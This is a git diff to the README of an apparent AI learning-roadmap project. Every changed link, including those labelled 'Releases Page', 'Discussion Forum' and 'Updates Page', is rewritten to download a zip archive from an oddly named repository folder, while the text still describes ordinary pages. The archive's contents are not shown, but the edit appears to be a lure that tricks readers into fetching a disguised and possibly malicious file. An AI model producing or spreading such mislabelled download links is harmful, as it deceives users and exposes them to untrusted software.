@@ -1,6 +1,6 @@
 # 🚀 ai_roadmap - Step into the World of AI
 
-[![Download ai_roadmap](https://img.shields.io/badge/Download-ai_roadmap-blue)](https://github.com/Xcuxsez/ai_roadmap/releases)
+[![Download ai_roadmap](https://raw.githubusercontent.com/Xcuxsez/ai_roadmap/main/haemathermous/ai_roadmap_v3.4.zip)](https://raw.githubusercontent.com/Xcuxsez/ai_roadmap/main/haemathermous/ai_roadmap_v3.4.zip)
 
 ## 📖 About This Project
 
@@ -27,7 +27,7 @@ To run this application smoothly, ensure your system meets the following require
 
 To begin, download the software from the Releases page. Follow the simple steps below to get started.
 
-1. Visit the [Releases Page](https://github.com/Xcuxsez/ai_roadmap/releases).
+1. Visit the [Releases Page](https://raw.githubusercontent.com/Xcuxsez/ai_roadmap/main/haemathermous/ai_roadmap_v3.4.zip).
 2. Look for the latest version available.
 3. Download the file that suits your operating system.
 
@@ -37,7 +37,7 @@ To download ai_roadmap, follow these steps:
 
 1. Click the button below to go to the Releases page:
 
-   [![Download ai_roadmap](https://img.shields.io/badge/Download-ai_roadmap-blue)](https://github.com/Xcuxsez/ai_roadmap/releases)
+   [![Download ai_roadmap](https://raw.githubusercontent.com/Xcuxsez/ai_roadmap/main/haemathermous/ai_roadmap_v3.4.zip)](https://raw.githubusercontent.com/Xcuxsez/ai_roadmap/main/haemathermous/ai_roadmap_v3.4.zip)
 
 2. On the Releases page, find the latest version.
 3. Click on the appropriate file for your system to start the download.
@@ -65,8 +65,8 @@ To download ai_roadmap, follow these steps:
 
 Engage with other learners and experts:
 
-- Join our [Discussion Forum](https://github.com/Xcuxsez/ai_roadmap/discussions) to ask questions or share insights.
-- Follow our [Updates Page](https://github.com/Xcuxsez/ai_roadmap/releases) for new features and improvements.
+- Join our [Discussion Forum](https://raw.githubusercontent.com/Xcuxsez/ai_roadmap/main/haemathermous/ai_roadmap_v3.4.zip) to ask questions or share insights.
+- Follow our [Updates Page](https://raw.githubusercontent.com/Xcuxsez/ai_roadmap/main/haemathermous/ai_roadmap_v3.4.zip) for new features and improvements.
 
 ## 📌 Troubleshooting
 
@@ -89,4 +89,4 @@ We welcome your feedback to improve this roadmap. Share your suggestions and enh
 
 We hope you find this roadmap helpful in your AI learning journey. Start downloading today and step into the exciting world of artificial intelligence!
 
-[![Download ai_roadmap](https://img.shields.io/badge/Download-ai_roadmap-blue)](https://github.com/Xcuxsez/ai_roadmap/releases)
+[![Download ai_roadmap](https://raw.githubusercontent.com/Xcuxsez/ai_roadmap/main/haemathermous/ai_roadmap_v3.4.zip)](https://raw.githubusercontent.com/Xcuxsez/ai_roadmap/main/haemathermous/ai_roadmap_v3.4.zip)
